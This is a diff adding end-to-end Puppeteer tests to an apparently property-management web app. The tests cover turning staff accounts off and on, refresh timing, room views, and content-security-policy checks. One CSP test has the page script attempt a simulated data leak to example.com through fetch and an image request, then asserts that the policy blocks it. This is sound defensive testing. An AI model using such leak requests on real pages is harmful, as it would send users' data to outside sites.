@@ -48,6 +48,10 @@ async function runAtWidth(browser, BASE, width) {
   await page.setViewport({ width, height: 780, isMobile: true, hasTouch: true, deviceScaleFactor: 2 });
   const jsErrors = [];
   page.on('pageerror', e => jsErrors.push(e.message));
+  // S17-4: every content-security-policy violation on any screen is recorded
+  const cspViolations = [];
+  await page.exposeFunction('__cspReport', v => { cspViolations.push(v); });
+  await page.evaluateOnNewDocument(() => { document.addEventListener('securitypolicyviolation', e => { try { window.__cspReport(`${e.violatedDirective} ${e.blockedURI}`); } catch (_) {} }); });
   const downloadDir = path.join(SHOTS, `dl-${width}`); fs.mkdirSync(downloadDir, { recursive: true });
   const cdp = await page.target().createCDPSession();
   await cdp.send('Browser.setDownloadBehavior', { behavior: 'allow', downloadPath: downloadDir, browserContextId: ctx.id });
@@ -1029,6 +1033,37 @@ async function runAtWidth(browser, BASE, width) {
     // It now has history (the rename and password change are in the audit log), so removal is refused politely
     const s163Del = await page.evaluate(id => apiFetch(`/users/${id}`, { method: 'DELETE' }).then(() => 'removed', e => e.message), s163u.id);
     ok(/cannot be removed/.test(s163Del), `${tag} S16.3 removing an account with history explains why and what to do`);
+    // S17-1: Turn off / Turn on through the screen
+    await page.evaluate(() => { window.__origConfirm = window.confirm; window.confirm = () => true; });
+    const s17Row = n => page.evaluate(n => { const r = [...document.querySelectorAll('#staff-tb tr')].find(x => x.textContent.includes(n)); return r ? { text: r.textContent, btns: [...r.querySelectorAll('button')].map(b => b.textContent.trim()) } : null; }, n);
+    ok((await s17Row('ui163r_' + width)).btns.includes('Turn off'), `${tag} S17-1 each other account has "Turn off"`);
+    ok(!(await page.evaluate(() => { const r = [...document.querySelectorAll('#staff-tb tr')].find(x => /You/.test(x.lastElementChild.textContent)); return r && [...r.querySelectorAll('button')].some(b => b.textContent.trim() === 'Turn off'); })), `${tag} S17-1 her own account has no "Turn off"`);
+    // Open a request sheet first, so its staff list is cached BEFORE the turn-off (review: stale cache)
+    const s17Req = await page.evaluate(() => apiFetch('/complaints').then(l => (l || []).find(c => !c.assigned_to) || (l || [])[0]));
+    ok(s17Req, `${tag} S17-1 (fixture) a request exists for the sheet check`);
+    await page.evaluate(id => requestSheet(id), s17Req.id);
+    await page.waitForSelector('#rq-assign', { timeout: 8000 });
+    ok(await page.$$eval('#rq-assign option', (os, n) => os.some(o => o.textContent.includes(n)), 'ui163r_' + width), `${tag} S17-1 before: the request sheet offers the account`);
+    await page.evaluate(() => closeModal());
+    await page.evaluate(n => { const r = [...document.querySelectorAll('#staff-tb tr')].find(x => x.textContent.includes(n)); [...r.querySelectorAll('button')].find(b => b.textContent.trim() === 'Turn off').click(); }, 'ui163r_' + width);
+    await page.waitForFunction(n => { const r = [...document.querySelectorAll('#staff-tb tr')].find(x => x.textContent.includes(n)); return r && /Turned off/.test(r.textContent); }, { timeout: 8000 }, 'ui163r_' + width);
+    ok((await s17Row('ui163r_' + width)).btns.includes('Turn on'), `${tag} S17-1 a turned-off account shows "Turned off" and "Turn on"`);
+    const s17Login = await page.evaluate(w => fetch('/api/auth/login', { method: 'POST', headers: { 'Content-Type': 'application/json', 'X-Forwarded-For': '192.0.2.201' }, body: JSON.stringify({ username: 'ui163r_' + w, password: 'Fresh-Pass-9' }) }).then(r => r.status), width);
+    eq(s17Login, 403, `${tag} S17-1 turned off through the screen, it cannot log in`);
+    // …and the request sheet's "Assigned to" list no longer offers it (cache refreshed by Turn off)
+    {
+      await page.evaluate(id => requestSheet(id), s17Req.id);
+      await page.waitForSelector('#rq-assign', { timeout: 8000 });
+      ok(!(await page.$$eval('#rq-assign option', (os, n) => os.some(o => o.textContent.includes(n)), 'ui163r_' + width)), `${tag} S17-1 the request sheet does not offer a turned-off account`);
+      await page.evaluate(() => closeModal());
+      await page.evaluate(() => switchAdminTab('staff'));
+      await page.waitForFunction(n => [...document.querySelectorAll('#staff-tb tr')].some(r => r.textContent.includes(n)), { timeout: 8000 }, 'ui163r_' + width);
+    }
+    await page.evaluate(n => { const r = [...document.querySelectorAll('#staff-tb tr')].find(x => x.textContent.includes(n)); [...r.querySelectorAll('button')].find(b => b.textContent.trim() === 'Turn on').click(); }, 'ui163r_' + width);
+    await page.waitForFunction(n => { const r = [...document.querySelectorAll('#staff-tb tr')].find(x => x.textContent.includes(n)); return r && !/Turned off/.test(r.textContent); }, { timeout: 8000 }, 'ui163r_' + width);
+    ok(true, `${tag} S17-1 "Turn on" brings it back`);
+    await noHScroll('Admin → Staff with Turn off');
+    await page.evaluate(() => { window.confirm = window.__origConfirm; });
     // Resident 360 has "Reset app login"
     const s163g = (await page.evaluate(() => API.getGuests())).find(g => g.is_active);
     await page.evaluate(id => residentProfile(id), s163g.id);
@@ -1105,6 +1140,65 @@ async function runAtWidth(browser, BASE, width) {
     await new Promise(r => setTimeout(r, 1500));
     ok(await page.evaluate(() => window.__pgOutboxCalls === 1), `${tag} D16.4-a Outbox "Sent" still refreshes when she stays`);
     await page.evaluate(() => { pgOutbox = window.__origPgOutbox; apiFetch = window.__origApiFetch; });
+    // S17-2: she re-opens the SAME screen while a save is in flight → the save still refreshes it
+    await page.evaluate(() => navigate('outbox')); await page.waitForFunction(() => currentPage === 'outbox', { timeout: 8000 });
+    await new Promise(r => setTimeout(r, 600));
+    await page.evaluate(() => {
+      apiFetch = (path, opts) => path.startsWith('/outbox/draft') ? new Promise(r => setTimeout(r, 1200)).then(() => window.__origApiFetch(path, opts)) : window.__origApiFetch(path, opts);
+      window.__pgOutboxCalls = 0; window.__origPgOutbox = pgOutbox; pgOutbox = (...a) => { window.__pgOutboxCalls++; return window.__origPgOutbox(...a); };
+      draftOutbox(); navigate('outbox');
+    });
+    await new Promise(r => setTimeout(r, 2500));
+    eq(await page.evaluate(() => window.__pgOutboxCalls), 2, `${tag} S17-2 re-opening the same screen during a save: the save still refreshes it (navigate + refresh)`);
+    await page.evaluate(() => { pgOutbox = window.__origPgOutbox; apiFetch = window.__origApiFetch; });
+    // S17-2: "Recompute" on Home — a slow brief must not pull her back after she moved on
+    await page.evaluate(() => navigate('dashboard')); await page.waitForSelector('.home-greeting', { timeout: 15000 });
+    await page.evaluate(() => {
+      apiFetch = (path, opts) => path.startsWith('/copilot/brief') ? new Promise(r => setTimeout(r, 1500)).then(() => ({})) : window.__origApiFetch(path, opts);
+      loadHome(true); navigate('rooms');
+    });
+    await page.waitForSelector('.room-tile', { timeout: 8000 });
+    await new Promise(r => setTimeout(r, 2500));
+    ok(await page.evaluate(() => currentPage === 'rooms' && document.querySelectorAll('.room-tile').length > 0), `${tag} S17-2 a slow "Recompute" does not pull her back to Home`);
+    await page.evaluate(() => { apiFetch = window.__origApiFetch; });
+    // S17-3: a room change refreshes the room view she is on
+    const s17Room = (await page.evaluate(() => API.getRooms()))[0];
+    const roomCalls = async (page_, wait) => {
+      await page.evaluate(p => navigate(p), page_);
+      await page.waitForFunction(p => currentPage === p, { timeout: 8000 }, page_);
+      await new Promise(r => setTimeout(r, wait));
+      await page.evaluate(id => {
+        window.__rc = { map: 0, table: 0 }; window.__oMap = pgRoomMap; window.__oTab = pgRooms;
+        pgRoomMap = (...a) => { window.__rc.map++; return window.__oMap(...a); };
+        pgRooms = (...a) => { window.__rc.table++; return window.__oTab(...a); };
+        markInspected(id);
+      }, s17Room.id);
+      await new Promise(r => setTimeout(r, 1500));
+      const rc = await page.evaluate(() => { const r = window.__rc; pgRoomMap = window.__oMap; pgRooms = window.__oTab; return r; });
+      return `${rc.map}/${rc.table}/${await page.evaluate(() => currentPage)}`;
+    };
+    eq(await roomCalls('rooms', 800), '1/0/rooms', `${tag} S17-3 on the Room map, a room change refreshes the map`);
+    eq(await roomCalls('rooms-table', 800), '0/1/rooms-table', `${tag} S17-3 on the Rooms table, it refreshes the table`);
+    eq(await roomCalls('dashboard', 1500), '0/0/dashboard', `${tag} S17-3 from another screen, it draws no room view over it`);
+    // The real path to the table: Room map → "Table" button (no navigate) → Edit → Save (review S17-3)
+    await page.evaluate(() => navigate('rooms')); await page.waitForSelector('.room-tile', { timeout: 8000 });
+    await page.evaluate(() => [...document.querySelectorAll('#page-content button')].find(b => b.textContent.trim() === 'Table').click());
+    await page.waitForFunction(() => document.querySelector('#page-content table') && !document.querySelector('.room-tile'), { timeout: 8000 });
+    await page.evaluate(r => roomModal(r), s17Room);
+    await page.waitForSelector('#modal-overlay .modal', { timeout: 5000 });
+    await page.evaluate(() => { window.__rc = { map: 0, table: 0 }; window.__oMap = pgRoomMap; window.__oTab = pgRooms;
+      pgRoomMap = (...a) => { window.__rc.map++; return window.__oMap(...a); }; pgRooms = (...a) => { window.__rc.table++; return window.__oTab(...a); }; });
+    await page.evaluate(() => [...document.querySelectorAll('#modal-overlay button')].find(b => b.textContent.trim() === 'Save').click());
+    await new Promise(r => setTimeout(r, 1800));
+    const rcT = await page.evaluate(() => { const r = window.__rc; pgRoomMap = window.__oMap; pgRooms = window.__oTab; return `${r.map}/${r.table}/${!!document.querySelector('#page-content table')}/${!!document.querySelector('.room-tile')}`; });
+    eq(rcT, '0/1/true/false', `${tag} S17-3 Map → Table button → Edit → Save stays on the table`);
+    // S17-4: a script on the page cannot send anything to another site
+    eq(cspViolations.length, 0, `${tag} S17-4 no content-security-policy violation on any screen so far (${cspViolations.slice(0, 5).join('; ')})`);
+    cspViolations.length = 0;
+    await page.evaluate(() => { fetch('https://example.com/leak?t=1').catch(() => {}); const i = new Image(); i.src = 'https://example.com/leak.gif'; });
+    await new Promise(r => setTimeout(r, 800));
+    ok(cspViolations.some(v => /^connect-src https:\/\/example\.com/.test(v)) && cspViolations.some(v => /^img-src https:\/\/example\.com/.test(v)), `${tag} S17-4 SECURITY: the policy blocks a page script sending data to another site (${cspViolations.join('; ')})`);
+    cspViolations.length = 0;
   }
   // Leaving-soon filter
   await page.evaluate(() => navigate('guests'));
@@ -1588,6 +1682,7 @@ async function runAtWidth(browser, BASE, width) {
   eq(Number((await page.$eval('#pay-waiting', e => e.textContent)).split('waiting')[0].replace(/[^0-9]/g, '')), s15Pending, `${tag} S15-6 the waiting line equals the s15Pending s15Rows`);
   await pool.query(`DELETE FROM collections WHERE receipt_number LIKE 'S15-${width}-%'`);
   eq(jsErrors.length, 0, `${tag} no uncaught JS errors (${jsErrors.join('; ')})`);
+  eq(cspViolations.length, 0, `${tag} S17-4 no content-security-policy violation on any screen (${cspViolations.slice(0, 5).join('; ')})`);
   await page.close(); await ctx.close();
 }
 
